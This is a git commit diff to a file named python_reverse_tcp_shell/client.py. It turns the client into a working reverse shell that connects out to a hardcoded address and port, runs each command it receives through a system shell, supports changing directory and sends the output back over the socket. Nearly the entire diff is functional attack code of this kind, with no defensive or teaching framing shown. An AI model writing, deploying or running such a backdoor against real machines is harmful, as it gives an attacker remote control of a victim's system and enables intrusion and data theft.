de689e9a929cf3e37a8a2a612299c3e699b3e46a
Kunal Yadav <39200197+kunaly1038@users.noreply.github.com>
2019-04-26 16:13:57 +0530

    Update client.py

--- python_reverse_tcp_shell/client.py
+++ python_reverse_tcp_shell/client.py
@@ -1,5 +1,7 @@
 import socket
 import subprocess
+import os
+import time
 
 host = '10.10.60.224'
 port = 9999
@@ -9,18 +11,25 @@ def create_socket():
     try:
         sock.connect((host, port))
         print('[+] Connecting to IP :', host)
-        print('[+] Connecting on Port :,', port, '\n')
+        print('[+] Connecting on Port : ', port, '\n')
     except  socket.error as err:
         print('[-] Error in Connecting : ', err)
         print('[+] Re-connecting to the host')
         create_socket()
     recieve_commad(sock)
 
+
 def recieve_commad(sock):
     while True:
         cmd = sock.recv(1024)
-        print(cmd)
-        sock.send(cmd)
+        if cmd[:2].decode("utf-8") == 'cd':
+            os.chdir(cmd[3:].decode("utf-8"))
+        if len(cmd) > 0:
+            output = subprocess.Popen(cmd[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                                      stderr=subprocess.PIPE)
+            out_bytes = output.stdout.read() + output.stderr.read()
+            out_str = str(out_bytes, "utf-8")
+            sock.send(str.encode(out_str + str(os.getcwd()) + ' >'))
 
 
 if __name__ == '__main__':
